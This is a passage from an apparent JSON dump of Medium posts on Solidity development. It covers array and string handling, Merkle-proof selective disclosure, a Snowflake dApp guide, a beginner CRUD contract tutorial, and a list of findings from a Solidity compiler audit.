polymorphism to write four functions with the same name, and different signatures, exploring all combinations of dynamic and fixed-size bi-dimensional arrays.Two of these functions are illegal, only because their particular array type cannot be passed to a function. Illegal is a bit of a strong word: the error says the type can be used, but only with the new experimental ABI encoder; and that in order to use it, it is necessary to include pragma experimental ABIEncoderV2;. However, we then would get a warning saying that it should not be used in production code.This restriction will likely be waived in the future, as new versions of Solidity come along, but for now, I just won\u2019t use these features and will look for workarounds.The common feature between these two types is that the inner type of the array \u2014 that is the type of its elements \u2014 is dynamic, of unknown size. These types cannot be passed into nor returned from a function.I will finalise this post with another example:The last two functions are illegal. The reason why is very consistent with everything that has been said before: string and bytes are dynamic types. Specifically, they are arrays: respectively, of UTF-8 characters, and of bytes. For that reason, the above return types are not really simple uni-dimensional arrays like those of getInts and getAddresses, but are instead bi-dimensional arrays with a dynamic inner type. And because of that, they cannot be passed into nor returned from functions at the current stage of Solidity.About the AuthorAlex is a software engineer at Aventus, working on the blockchain engineering team. He has 20 years of experience working in technology, completing a PhD in Computer Science as well as a post-doctorate in Cryptography. As part of his research, Alex has published papers on Kolmogorov Complexity, Cryptography, Database Anonymization and Code Obfuscation.Alex also spent seven years lecturing at the University Institute of Maia, including directing the degree programmes for BSc Computer Science and Information Systems and Software.", "responses": 0, "tags": ["Programming", "Solidity", "Ethereum", "Ticketing", "Arrays In Solidity"]}, {"title": "Super-Simple Zero-Knowledge Proofs in Solidity for Ethereum", "post_link": "https://medium.com/robhitchens/selective-disclosure-with-proof-f6a1ac7be978?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://medium.com/@robhitchens", "publish_date": "2018-09-09", "last_modified_date": "2019-03-26", "readtime": "6.38", "claps": 270, "voters": 18, "content": "Super-Simple Zero-Knowledge Proofs in Solidity for EthereumA simple and efficient storage structure for arbitrarily large data sets with selective disclosure of contents and proof of authenticity.Rob HitchensFollowSep 9, 2018 \u00b7 7 min read\u2026 and with a method for designing smart contract logic contingent on proven external states.\u201cperson holding passport\u201d by Agus Dietrich on UnsplashIn case the hash concepts are new, check out this gentle introduction: https://simple.wikipedia.org/wiki/Cryptographic_hash_functionGenerally-speaking, it\u2019s a bad idea to store anything too large in a blockchain owing to the high cost of storage itself. A common solution to this problem is to store only the hash of a large object in a smart contract, and then store the bulk of the object elsewhere.Without delving into specific use-case details, suffice it to say that a smart contract can store a great deal of information about an object\u2019s origin, lineage, and the approval/on-boarding process that led to the on-chain immortalizing of a certain hash that everyone will recognize as \u201cauthentic\u201d. An observer in possession of an object simply hashes the object and then uses the smart contract to confirm authenticity and to inspect other interesting details.The following description addresses a limitation of the common approach described above.Problem:Imagine Alice has objects such as 1) a driver\u2019s license, 2) a passport and 3) a birth certificate. Each document is represented by a JSON object that includes all the data fields present. Each such JSON object is issued by an authoritative registry, and we can imagine a smart contract that records the hashes of authentic documents. Nothing gets on that list without following the strict on-boarding process of the contract.Imagine Alice wants to show Bob her date of birth without disclosing any further personal details.Since each form of ID contains a date of birth, she has three possible ways to reveal this detail (her birthday) to Bob.Since each form of ID is easily authenticated by a hash on a blockchain, Bob would be able to consult the appropriate registry which would confirm the authenticity of any document Alice decided to reveal.For this to work, Alice would have to give Bob the entire object. Alice faces a dilemma. She has three objects to choose from, but each object contains more information than Alice wants to reveal, for example her home address, her travel history and her place of birth depending on whether she chooses to reveal her complete driver\u2019s license, her entire passport, or her complete birth record.Alice can say these documents contain a certain date of birth, but Bob cannot independently prove that Alice is telling the truth unless she reveals one of these documents in every detail, which Alice doesn\u2019t want to do.In fact, Alice can\u2019t prove anything without selecting one of the documents and disclosing it to Bob, in its entirety. Again, Alice doesn\u2019t want to do that.How can Alice prove she is telling the truth about a single field? How can that be done without migrating all of the important fields to expensive on-chain storage in the registry contracts?Solution:Consider a simple JSON object{  \u201cname\u201d: \u201cAlice\u201d,  \u201cdateOfBirth\u201d: \u201c01/01/1984\u201d,  \u201cplaceOfBirth\u201d: \u201cOceana\u201d}Alice will prove that the document contains \u201cdateOfBirth\u201d: \u201c01/01/1984\u201d without disclosing the entire JSON object by using something called a Merkle Proof.A Merkle Proof proves the existence of a value within a dataset, which is exactly what we want. If you\u2019re not familiar with Merkle Proofs, have a look over here: https://www.quora.com/Cryptography-How-does-a-Merkle-proof-actually-workFor a Merkle Proof to work, we need a Merkle Tree. A Merkle Tree recursively hashes pairs of values until finally there is only one hash left, known as the Merkle Root. Conveniently for us, we start with pairs of keys and corresponding values, which is actually two things.Alice proves the birthday claim is authentic by providing the root hash (document ID) and two more hashes.In case the proving process isn\u2019t clear, Alice wants to prove that \u201cdateOfBirth\u201d: \u201c01/01/1984\u201d exists in an authentic document.Starting with that pair, anyone can derive the hash of the two values she says are there (CD).Alice also supplies AB as part of her proof.With this extra information, anyone can compute ABCD.All that\u2019s missing is EF, so Alice supplies that as well.Now, anyone can compute the root hash, which is the unique identifier for the document in the on-chain registry.The registry can confirm that document ID (Merkle Root) is an authentic document.So, Alice has convincingly demonstrated that there is a certain key:value pair in a verifiably authentic document.Since we know that hashes are one-way functions, we know Alice could only produce such a formulation by working from knowledge of the contents of the original document. There is no known economically viable method of imitating this sort of mathematical demonstration of knowledge of the contents of the document.Consider what would happen if the topology and values of the Merkle Tree was part of the JSON object itself. Simplified:{  \u201cmerkleTree\u201d: [    \u201c0x123\u2026\u201d,    \u201c0xabc\u2026\u201d,    \u201c0x456\u2026\u201d,    \u201c0xdef\u2026\u201d],  \"name\u201d: \u201cAlice\u201d,  \"dateOfBirth\u201d: \u201c01/01/1984\u201d,  \u201cplaceOfBirth\u201d: \u201ceurasia\u201d}The root node is a suitable key to include in a blockchain because it sums up all of this in a single 32-byte word. It takes up the same amount of space as a simple hash of the object, but it\u2019s more useful.Since the correct construction of a Merkle Tree is self-evident given a certain set of data, it can be solved on-the-fly. There is no need to actually stuff the Merkle Tree details inside the objects.The main requirement is to organize the details you want to be separately and selectively disclosable into Merkle Trees and rely on the Merkle Root instead of simple document hashes when using smart contracts to authenticate off-chain objects.Now, Alice can construct a Merkle Proof showing that there is a field:value pair \u201cdateOfBirth\u201d: \u201c01/01/1984\u201d in the document with a certain ID. Importantly, she does not need to reveal the entire contents of the document to the observer. For the observer, it\u2019s enough to see that it is a legitimate piece of ID, confirmed by a proper authority (which is a smart contract), and the data set does indeed contain the one piece of information (key:value pair) Alice wishes to disclose.Hashes are one-way functions, so a Merkle-Proof doesn\u2019t leak or even hint at the contents of the rest of the document.Encrypting the Source DocumentAstute readers will have noticed that up until now, Alice\u2019s document has been exposed (See? It\u2019s right up there ^). Consider what happens when the document is encrypted so that only Alice can decrypt it, or protected so only Alice can see it.Alice herself has no problems constructing Merkle Proofs for any key:value pair she cares to disclose to others. Observers can see that she is working from authentic source documents and providing Merkle Proofs for everything she says. Even so, document contents are out of reach to others unless Alice decides to reveal them.In effect, Alice would be proving:\u201cI have a birth certificate with this unique identifier. You can confirm authenticity by checking the birth registry smart contract yourself. I have access to the details of this birth certificate because it belongs to me. On this birth certificate, the \u201cdateOfBirth\u201d is \u201c01/01/1984\u201d. Here\u2019s a Merkle Proof. Your own mathematicians will confirm there is no viable alternative explanation for its existence.\u201dIn summaryThis method facilitates the efficient storage of objects of any size and facilitates the selective disclosure of discrete details of the contents of such objects.This method is agnostic about storage infrastructure and blockchain of choice. We use blockchain smart contracts to register authentic documents, describe document origins, provide the history of the issuance process, the signers, and so on. Merkle Roots can be used as unique identifiers for documents or document versions or as attributes of documents known by some other key.We use inexpensive persistent data stores to store the bulky details. We store the Merkle Root\u2019s of authentic documents on blockchains instead of document hashes. This method supports selective disclosure of parts of the objects at the key:value pair level.This method is compatible with any encryption or access-control scheme aimed at keeping the source document out of public view. The only requirement is that the prover must have access to correct information. In the simplest scenario, Alice can see the entire document, so she can compute the Merkle Tree and construct proofs of its contents. It\u2019s not even strictly necessary that Alice can see the whole document, provided she has the extra node hashes she needs for her proofs.OnwardThis method potentially allows smart contract logic to access state information stored off-chain. A state change (or other logic) can be contingent on the user providing a Merkle Proof of a value that is not, itself, stored in the expensive smart contract state.In Ethereum (Solidity), it might look something like this (pseudo):modifier only18Plus(uint dateOfBirth, bytes32[] proof) { require(isMerkleProof(\u201cdateOfBirth\u201d, dateOfBirth, proof)); require(dateOfBirth <= eighteenYearsAgo); _;}function forAdultsOnly(uint dateOfBirth, bytes32[] proof) public only18Plus \u2026The real world is not quite so simple but it is interesting to consider that contract logic could be conditional on presenting proofs of external states.UpdateAs luck would have it, Open Zeppelin now has a Merkle Proof example, here: https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v2.2.0/contracts/cryptography/MerkleProof.solRob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.", "responses": 1, "tags": ["Blockchain", "Zero Knowledge Proofs", "Ethereum", "Solidity"]}, {"title": "The Complete Developers Guide to Building on Snowflake: Part 1 \u2014 Solidity", "post_link": "https://medium.com/hydrogen-api/the-complete-developers-guide-to-building-on-snowflake-part-1-solidity-329078776741?source=search_post", "author_name": "Andy Chorlian", "author_link": "https://medium.com/@HydroAndy", "publish_date": "2018-08-31", "last_modified_date": "2018-09-05", "readtime": "3.25", "claps": 339, "voters": 15, "content": "The Complete Developers Guide to Building on Snowflake: Part 1 \u2014 SolidityAndy ChorlianFollowAug 31, 2018 \u00b7 4 min readThis is going to be an in-depth guide on how to build an Ethereum dApp that fully utilizes the functionality of Snowflake. I will cover both the backend (Solidity) and the frontend (React).Getting StartedTo follow along with this guide you are going to need a few things:I would recommend that you have at least some experience building dApps with Solidity.A general knowledge of React (I just learned it last month. Knowing Javascript should be fine if you are good at learning on the fly).A Github account.To get a working proof of concept for a dApp is really going to depend on how complicated your application is and the scope of what you are doing in the app. For a basic dApp, all of this can certainly be done in a days work.You will also need to acquire Rinkeby Testnet Ether and Hydro.To acquire Testnet Ether, follow the steps in this StackExchange answer:How do I \"Buy\" tokens on the Rinkeby (test) environment?RinkedBy official faucet uses 3rd party social network to prevent malicious actors. You only need to go to this page\u2026ethereum.stackexchange.comTo acquire Testnet Hydro, connect your Rinkeby account from MetaMask on this page:Rinkeby Accounts, Address and ContractsSource Code Copy Find Similiar Contracts pragma solidity ^0.4.18; /** * @title Ownable * @dev The Ownable contract has\u2026rinkeby.etherscan.ioand \u201cwrite\u201d the getMoreTokens function, which is a function on the Rinkeby version of the HYDRO token contract that creates 10,000 HYDRO and pulls it into your wallet.Smart ContractSnowflake, is currently live on Rinkeby and allows for developers to leverage a few key features that we feel really help the development process. Some of these key features are:Multiple addresses linked to an accountEasy access to integrating token economics into any dAppUser sign up and account deletionAccess to a dApp store for all Snowflake users for visibilityIn order to leverage these capabilities it is important that all smart contracts inherit the Snowflake Resolver contract. This contract implements all of the required functionality that is needed to be a resolver. Here is a basic contract which is implementing the Snowflake Resolver contract and utilizing some of its logic.Lets take a look at whats going on here:Line 12: Setting this variable to true tells the Snowflake contract that we have custom sign up logic.Lines 22 & 44: Here we have the onSignUp function. This function is called automatically when a Snowflake user sets your dApp. For each dApp this logic will need to be custom based on the needs of the dApp. In our example, we are just taking the HydroID that is passed to us and checking if they are already a member. If they are, then they can\u2019t sign up again. If they aren\u2019t we add them as a member.Here is an example of an onSignUp function which is also utilizing the Hydro allowance to charge users a fee:The sign up is attempting to withdraw the signUpFee variable from the users Snowflake balance. If this is not successful, the user cannot use the dApp. This withdraw functionality can be used all throughout your dApp. As long as the user has set an allowance for your dApp in their Snowflake they will be able to easily transfer you Hydro and you won\u2019t have to ever worry about calling approveAndCall again!!Now lets take a look at a finished dApp.This is our basic status dApp (you should recognize the sign up from above). It allows for Snowflake users to set a status that is stored immutably on Ethereum. The important thing to note here is in line 39. This function utilizes one of the cooler abilities of Snowflake, multiple addresses per Snowflake. The function calls getHydroId which in turn gives the HydroID related to the address which called the function. This allows for users who have different Ethereum addresses on different devices to interact with your dApp without having to risk the safety of their private keys/seed words by exporting them ever. It is highly recommended that all user functionality is done based on HydroID instead of address for Snowflake dApps because of this.Now lets deploy our dApp! If you aren\u2019t familiar with how to do this, I recommend you check outThe ultimate end-to-end tutorial to create and deploy a fully decentralized Dapp in ethereumIn this tutorial my objective is to walk you through the steps required to create a decentralized application from\u2026medium.comOnce your dApp is deployed you will want to head over to Part 2 of this series, which will explain how to link your newly made dApp with Snowflake and how to create an awesome React frontend for what you made!", "responses": 0, "tags": ["Ethereum", "Dapps", "Blockchain", "Hydro", "Developer"]}, {"title": "Working with Strings in Solidity", "post_link": "https://medium.com/hackernoon/working-with-strings-in-solidity-c4ff6d5f8008?source=search_post", "author_name": "Aventus Network", "author_link": "https://medium.com/@aventus", "publish_date": "2018-07-17", "last_modified_date": "2018-07-19", "readtime": "8.81", "claps": 75, "voters": 15, "content": "Working with Strings in SolidityAventus NetworkFollowJul 17, 2018 \u00b7 9 min readThis is the first in a series of blogs we\u2019re going to bring to you directly from the trenches, going into some of the nitty-gritty technical detail of some of the things we\u2019re doing with the Protocol at the moment.Today\u2019s article comes from Alex Pinto, a recent addition to the Aventus blockchain engineering team who\u2019s been spending the past few weeks getting up to speed on using Solidity, and will take us through some of the challenges and particularities of the language.Today I give you a post about programming for the Ethereum blockchain using the Solidity language. I won\u2019t follow any plan in doing this: my objective is only to write about my obstacles in learning this language and the practical difficulties I encounter in my daily work.I want the freedom to write about any topic without having first to introduce preliminary material, as I\u2019d have to do if I were writing a textbook. If you notice me talking about things I have not explained before, that is by design. Leave me a comment below and I\u2019ll come back to them in a later post.Basic accessToday, I want to talk about strings in Solidity. Solidity is, at first, similar in syntax to Javascript and other C-like languages. Because of that, it is easy for a newcomer with a grounding in one of several common and widespread languages to get a quick grasp of what a Solidity program does. Nevertheless, Solidity is mighty in the proverbial details that hide unforeseen difficulties. That is the case of the type string and the related type bytes.Both of these are dynamic array types, which means that they can store data of an arbitrary size. Each element of a variable of type bytes is, unsurprisingly, a single byte. Each element of a variable of type string is a character of the string. So far so good, but the initial looks are deceiving. One who comes from other languages might expect the string type to provide several useful functions, like:determining the string\u2019s lengthreading or changing the character at a given location in the stringjoining two stringsextracting part of a stringBad news: Solidity\u2019s string does none of this! If we need any of the above, we have to do it manually.So, let\u2019s explore some of these difficulties and see what we can do about them. I open Remix and type the following code in a new file called string.sol.The right side of the screen, in Remix, is taken by the developer\u2019s area. In the Compile tab, I check the Auto-Compile option, so that Remix will notify me of errors and code-analysis warnings as I write my code. The static code-analysis is controlled by the options in the tab Analysis, and I usually have all options selected.In the current case, Remix will report two warnings of the same kind: the methods I have written can potentially have a high-to-infinite gas cost. I will ignore that in this post.The above contract is very minimal. It defines a state variable store of type string, a method to set it and a method to get it. Let\u2019s test it.In the Run tab, I hit Deploy and if there are no problems with the contract, a new area will appear below that button with the address where the contract is located and the functions that are available.Below the working area, Remix shows a detailed record of the transaction\u2019s result. Initially, it shows only a line indicating the account that deployed the contract, the contract and method that was called, ie String.(constructor), and how much Ether was passed to the execution (initially this is shown in Wei, which is the smallest unit of Ether, corresponding to 10^-18 Ether). We can expand it by clicking over the header, revealing logs, execution and transaction costs, available gas, final result, etc.At this point, I just want to press the button getStore on the right, and notice how that shows beneath it the result:Likewise, there is a new transaction log on the left and by clicking it we can see:in the decoded output. All is well.Now, I type \u201c0123456789\u201d in the textbox to the right of setStore and hit that button. Then I call getStore again and I receive that string. Thumbs up, we can do basic storage/retrieval with strings!Let\u2019s now go for more interesting things.Creating new strings: data locationSo far, I have accessed a literal string and we have seen how we can change it by assigning to it. But that is only a very coarse way of dealing with strings. Let us create a string character by character. This will introduce us to one peculiarity of Solidity programming: data location.I create a new method that only returns a new string with three specific characters: \u201cAbc\u201d.This is a well-intentioned effort, but does not work. Remix is kind enough to immediately point 4 errors and 1 warning:Two of these are on the same line: string newString = new string(3);Warning: Variable is declared as a storage pointer. Use an explicit \u201cstorage\u201d keyword to silence this warning.TypeError: Type string memory is not implicitly convertible to expected type string storage pointerThe other three occur in the following lines, eg newString[0] = \"A\"; and are all of the same type:TypeError: Index access for string is not possible.To understand the first issue, I have to tell you about data location. Writing to the blockchain is very expensive. Every node that runs the transaction has to do the same writing, which makes the transaction more expensive and the blockchain bigger. When a node downloads a block containing this transaction, it will incur larger storage costs because of this writing. In Ethereum, every transaction has an associated cost, called gas, to incentivise programmers to be as economic as possible.When writing a contract, authors have a choice of what kind of data to use: memory is cheap (i.e. it costs relatively low gas, but the data are volatile and lost after a function finishes executing); storage is the most expensive (and is absolutely needed for contract state, which must persist from function call to function call); there is also a calldata location (that corresponds to the values in the stack frame of a function that is executing). This is the cheapest location to use, but it has a limited size. In particular, that means that functions may be limited in their number of arguments.Every data type has a default location. This is from the Solidity documentation:Forced data location:-parameters (not return) of external functions: calldata-state variables: storageDefault data location:-parameters (also return) of functions: memory-all other local variables: storageNotice the subtlety: function parameters are by default stored in memory, except if the function is external, in which case they will be stored in the stack (ie calldata). This means that a function that is perfectly alright when public can suddenly have too many arguments when made external.Now, let\u2019s come back to our code and examine the linestring newString = new string(3);This is a local variable inside the function, and so by default it is in storage. The new keyword is used to specify the initial size of a memory dynamic array. Memory arrays cannot be resized. On the other hand, we can change the size of a storage dynamic array by changing its lengthproperty, but can\u2019t use new with them.This is the source of our error. In this case, all we want to do with this string is create it and return it to the outside. Let the outside world decide what to do with it, and whether it is temporary only or important enough to persist on the blockchain. In this example, the storage is not important, and the string will be created in memory. To do that, we add the memory keyword in the declaration, like this:string memory newString = new string(3);Direct access to strings: equivalence with bytesLet\u2019s see the second sort of errors now. This is simple and unavoidable: Solidity does not currently allow index access to strings. From the FAQ:string is basically identical to bytes only that it is assumed to hold the UTF-8 encoding of a real string. Since string stores the data in UTF-8 encoding it is quite expensive to compute the number of characters in the string (the encoding of some characters takes more than a single byte). Because of that,string s; s.length;is not yet supported and not even index access s[2]The alternative is to first transform the string into bytes, and then access it directly. This works because string is an array type, albeit with some restrictions.But there is a trap to watch out for. bytes stores raw data; string stores UTF-8 characters. The following code does not always return the number of characters in _s:The problem here occurs if _s contains any character that takes more than 1 byte to represent in UTF. In that case, the function returns the length of the byte representation of the input string, and will be more than the number of characters.This has also an impact when trying to address a particular character of the string, as we cannot predict at which location the character\u2019s bytes will be. We have to parse the string linearly identifying any multi-byte character, or else make sure we restrict our input to characters of fixed length. If we work exclusively with ASCII strings, for example, we\u2019ll be safe.Returning to our previous function, this works:But for example, the following code which tries to set the third character of a string to X, will fail when it receives multi-byte characters.This returns \u201cAbXdef\u201d for an input of \u201cAbcdef\u201d, but returns \u201cXb\u00c1n\u00e7!\u201d for an input of \u201c\u20acb\u00c1n\u00e7!\u201dConclusionThere are still many more things that can be said about this topic, but this is a long enough post already, so I\u2019ll wrap up. The key concept regarding the type string is that this is an array of UTF-8 characters, and can be seamlessly converted to bytes. This is the only way of manipulating the string at all. But it is important to note that UTF-8 characters do not exactly match bytes. The conversion in either direction will be accurate, but there is not an immediate relation between each byte index and the corresponding string index.For most things, there may be an advantage in representing the string directly as the type bytes (avoiding conversions) and be very careful when using characters that are encoded in UTF by more than one byte.That\u2019s enough for now. See you another day, with more steps in this coding adventure.About the AuthorAlex is a software engineer at Aventus, working on the blockchain engineering team. He has 20 years of experience working in technology, completing a PhD in Computer Science as well as a post-doctorate in Cryptography. As part of his research, Alex has published papers on Kolmogorov Complexity, Cryptography, Database Anonymization and Code Obfuscation.Alex also spent seven years lecturing at the University Institute of Maia, including directing the degree programmes for BSc Computer Science and Information Systems and Software.This article was originally posted on his blog.About AventusAventus is a blockchain-based protocol that delivers increased trust, security and control for the live-event ticketing industry, practically eliminating counterfeit tickets and unfair scalping. Organisers can create, manage and promote their events and associated tickets, dramatically reduce platform costs, and significantly influence secondary markets.For more information, visit Aventus.io and follow Aventus on Twitter, Telegram and Reddit.", "responses": 3, "tags": ["Programming", "Solidity", "Ethereum", "Blockchain", "Strings In Solidity"]}, {"title": "Solidity CRUD Tutorial, Part 1 \u2014 Building a Smart Contract with CRUD Operations", "post_link": "https://medium.com/crowdbotics/solidity-crud-tutorial-part-1-building-a-smart-contract-with-crud-operations-55fc2bc5240?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2018-10-09", "last_modified_date": "2019-06-12", "readtime": "5.36", "claps": 56, "voters": 14, "content": "Solidity CRUD Tutorial, Part 1 \u2014 Building a Smart Contract with CRUD OperationsLearn how to build a simple smart contract on Ethereum and how to test it using Truffle frameworkGaurav AgrawalFollowOct 9, 2018 \u00b7 6 min read*This tutorial is targeted to beginner audience and Do not use this code/pattern in a production setting. Also, look into more in Solidity\u2019s common patterns*Today, we will learn how to build a simple smart contract on Ethereum and how to test it using Truffle framework. Our smart contract will perform basic create, read, update, delete (CRUD) operations.Table of ContentsQuick definitionsBuilding a smart contract with CRUD operationsTesting CRUD smart contract using Truffle (Part 2)Quick DefinitionsWhat is Ethereum? \u2014 Ethereum is an open source smart contract platform on which you can build decentralized applications (Dapps).What is Solidity? \u2014 Solidity is one of the most famous language to code smart contract on ethereum. It is designed for smart contract programming. It\u2019s syntactically similar to javascript.What is a smart contract? -In simple words, A smart contract is a piece of code which controls some kind of digital asset. It defines rules for transferring asset and penalties like a traditional contract. The best thing is that it automatically perform these transfers and penalties based on pre-coded conditions without a need for a middleman.Building a smart contract with CRUD operationsOur smart contract is very simple and basic in nature. It will store countries, their leaders and population.Fun Fact \u2014 \u201cAccording to the United Nations & the CIA World Fact Book, there are 195 Countries recognized by the World.\u201dIt can be optimized but the mantra is \ud83d\udc47Andy is Eng. manager at Google and works on Google chrome projectSo let\u2019s dive in.curdApp.solFor convenience I have added our CRUD Smart contract above now we will go through the code and understand different aspect of our CrudApp and basic solidity language programming.Think of a \u2018contract\u2019 as a \u2018class\u2019 in other programming languages.Pragma \u2014 It specifies which compiler version should be used. This only works after solidity version 0.4.0.Solidity Data TypesStruct \u2014 Using struct keyword you can define structures in Solidity. A structure is a user-defined data type that can be used to group items of possibly different types into a single type. Our structure will store country related properties.namecountrypopulationstruct country{ string name; string leader; uint256 population; }We are using strings to store country name and their leader\u2019s name and uint256 datatype to store the population of the country. We are storing our countries in an Array. (Where we\u2019ll perform all our CRUD operations)uint256 public totalCountries;       function CurdApp() public{       totalCountries = 0;   }We are using a variable to track the number of countries and then initializing it on the constructor with 0.Events- With the help of events, we can utilize EVM\u2019s logging facility. Use eventkeyword following the event name and parameter to define events. We have defined 3 events for the operations which modify our stored.event CountryEvent(string countryName , string leader, uint256 population);event LeaderUpdated(string countryName , string leader);event CountryDelete(string countryName);Create Operation -Now let\u2019s look at our insert function which is storing new countries.function insert( string countryName, string leader,  uint256 population) public   returns (uint256 totalCountries){     country memory newCountry = country(countryName , leader, population);        countries.push(newCountry);        totalCountries++;            emit CountryEvent (countryName, leader, population);        return totalCountries;   }This function taking 3 parameters and returning a number of total countries after completing the function.We didn\u2019t add basic checks, add them and comment your code on the response.Operations and Storage are costly on ethereum. So we are declaring a temporary struct with the use of memory keyword then we will push it on countries array which we defined above. After that, we log our event using emit keyword. That\u2019s it a simple straightforward creation of our first entry.Read operation \u2014Now we want to read what we have stored. So let\u2019s read countries data using country name. Our function simply iterates through entries and returns details if a positive match found.function getCountry(string countryName) public view returns(string name , string leader , uint256 population){        for(uint256 i =0; i< totalCountries; i++){           if(compareStrings(countries[i].name, countryName)){              return (countries[i].name , countries[i].leader , countries[i].population);           }       }       revert('country not found');   }Revert() \u2014 Ethereum operations take gas (ether) to run, so we need to optimize that. Revert function check condition and revert unused gas to the user. They should be used at the start so your function will use less gas.revert(\u2018Something bad happened\u2019);Solidity provides two more functions assert() and require(). But discussing them is out of scope for this tutorial. You can find an awesome write us about it here.View modifier- Above, we added in view modifier in function. By adding view, we simply mean that function is not modifying any state and just reading the current state. In other words, it\u2019s a read-only function.Solidity has a bunch of modifiers and you can also create your own modifiers. Here\u2019s a list of conditions for a statement to be considered as \u201cmodifying the state\u201d:State variables being written to.Events being emitted.Other contracts being created.Self-destruct being used.Ether being sent via calls.Calling functions that are not marked view or pure.Low-level calls being used.An inline assembly containing certain opcodes being usedUpdate operation -Now let\u2019s update our countries data. For example, we want to change Trump with Hilary \ud83d\ude1c.function updateLeader(string countryName, string newLeader) public returns (bool success){       //This has a problem we need loop       for(uint256 i =0; i< totalCountries; i++){           if(compareStrings(countries[i].name ,countryName)){              countries[i].leader = newLeader;              emit LeaderUpdated(countryName, newLeader);              return true;           }       }       return false;   }It\u2019s taking 2 parameters and running a loop to find the country in our countries array. If there is a positive match, It replaces the leader with your input leader.Same way, you can create an updatePopulation function and comments on the response.Delete Operation \u2014Now let\u2019s look at delete operation. In our delete we are removing the country which user wants and replacing it with last entry in our countries array.function deleteCountry(string countryName) public returns(bool success){        require(totalCountries > 0);        for(uint256 i =0; i< totalCountries; i++){           if(compareStrings(countries[i].name , countryName)){              countries[i] = countries[totalCountries-1];               delete countries[totalCountries-1];               totalCountries--;               countries.length--;              //emit event              emit CountryDelete(countryName);              return true;           }       }       return false;   }Other functions-We have created some other functions too. One of comparing the string and other for giving the length of our array.function compareStrings (string a, string b)  internal pure returns (bool){       return keccak256(a) == keccak256(b);   }        function getTotalCountries() public view returns (uint256 length){      return countries.length;   }If you followed till now, let do some google search too. Respond in comments why we used keccak256() while comparing two strings?In next part we will test out CRUD smart contract with help of truffle framework.Notes & suggestions -Smart contract controls assets, so they should be designed carefully and should follow a minimalistic approach. They should be properly audited in a production scenario for controlling assets. Smart contracts are the trust central of a decentralized app and the autonomous part of the system.Blockchains are not just a database. Blockchain maintains a global state. Every change has to reflect on every node participating in the network, so changes are costly.In the above tutorial, we used basic CRUD operation. Our crud design has few weak points, optimize it and let us know in the comment section. Operations are costly on Ethereum and you should minimize them while coding a smart contract.On To Part 2\u2026Building A Web Or Mobile App?Crowdbotics is the fastest way to build, launch and scale an application.Developer? Try out the Crowdbotics App Builder to quickly scaffold and deploy apps with a variety of popular frameworks.Busy or non-technical? Join hundreds of happy teams building software with Crowdbotics PMs and expert developers. Scope timeline and cost with Crowdbotics Managed App Development for free.", "responses": 4, "tags": ["Ethereum", "Solidity", "Blockchain", "Truffle", "Tutorial"]}, {"title": "Solidity Compiler Audit", "post_link": "https://medium.com/zeppelin-blog/solidity-compiler-audit-8cfc0316a420?source=search_post", "author_name": "Zeppelin", "author_link": "https://medium.com/@ZeppelinOrg", "publish_date": "2018-11-01", "last_modified_date": "2019-02-26", "readtime": "4.63", "claps": 263, "voters": 15, "content": "Solidity Compiler AuditZeppelinFollowNov 1, 2018 \u00b7 5 min readThe Augur team and the Ethereum Foundation (through a joint grant) asked us to review and audit the Solidity compiler. We looked at the code and now publish our results.The audited project can be found in the ethereum/solidity GitHub repository. The version used for this report is commit e67f0147998a9e3835ed3ce8bf6a0a0c634216c5 (tag v0.4.24).The full report can be found here, and a list of the issues ordered by severity can be found next.Critical SeverityCRITICAL: Incorrect library addresses can be injected while linking.CRITICAL: Comments can be disguised as executable code.High SeverityHIGH: Model is very complex and could use more documentation.HIGH: Known issues only emit warnings for backwards compatibility.HIGH: There is no report of unit test coverage.HIGH: Low unit test coverage.HIGH: All strings are UTF-8.HIGH: Modifiers can be overridden with no special syntax or warnings.HIGH: solc-js output with optimizations is non-deterministic in some environments.HIGH: No error message on uninitialized storage references.HIGH: Missing return statement on a function does not issue an error.HIGH: Fuzzing setup is broken.Medium severityMEDIUM: Insecure system call may lead to command execution.MEDIUM: Swarm hash implementation is outdated.MEDIUM: Fallback mechanism in imports is not working properly.MEDIUM: Coinspect audit still has unaddressed issues.MEDIUM: Bus factor is 2.MEDIUM: There is no code of conduct.MEDIUM: There is no clear test structure.MEDIUM: There is no intermediate language.MEDIUM: The syntax for the fallback function is prone to confusion.MEDIUM: Some public functions cannot be made external.MEDIUM: State variables can be shadowed.MEDIUM: Optional optimizations may not be safe.MEDIUM: Optimizations code in the assembler (libevmasm) is hard to read.MEDIUM: Fragile code in the CSE optimizer.MEDIUM: All optimizations are very low level.MEDIUM: Modifiers can return.MEDIUM: No error when externally calling contract code from a constructor.MEDIUM: No dead code warning.MEDIUM: Crash when trying to declare an already declared variable with the same name.MEDIUM: Crash when converting signed rational using ABIEncoderV2Low severityLOW: Coding style hinders readability and may lead to programming errors.LOW: Insecure string handling.LOW: The quality of sourcemaps could be improved.LOW: There are many assertThrow usages without a messageLOW: Storage of small value types is unnecessarily costly.LOW: There are issues tagged as Soon that have not been updated in a long time.LOW: There are many untriaged issues.LOW: There are few issues tagged as Good first issue.LOW: There are many open pull requests with multiple comments.LOW: There are many stale branches.LOW: There is no stable release cadence.LOW: There is no site for news about the project.LOW: There is a lot of inconsistency on the Julia, IULIA, Yul name.LOW: The status of Yul is not clear.LOW: The main project README is missing important information.LOW: The main page of the user documentation has many links.LOW: It is unclear which files are included in a GitHub release.LOW: Whiskers is documented as part of the contribution guidelines.LOW: The process for helping with translations is not documented.LOW: Documentation translations are hosted on independent sites.LOW: There is no documentation explaining how to help testing the nightly build.LOW: There is no documentation on how tests are run on Continuous Integration.LOW: There is no clear documentation for experimental features.LOW: No documentation available for libsolc.LOW: README for Yul optimizations is incomplete.LOW: Missing information for successfully building Solidity\u2019s fuzzer AFL.LOW: soltest custom command line arguments are not listed in help.LOW: There is no clear documentation about the constructor not being part of the deployed code.LOW: Contracts from external projects are duplicated in the Solidity code repository.LOW: Some tests are run twice on different Continuous Integration systems.LOW: There are no static tests enforcing a consistent code style.LOW: It is very difficult to run tests locally.LOW: Building in some Linux distributions fails.LOW: Missing file on compilation when using SANITIZE.LOW: Insecure environment variable handlingLOW: No errors on missing output option.LOW: Inconsistent AST output.LOW: Confusing options naming.LOW: Undocumented clone contract feature.LOW: General CLI inconsistencies 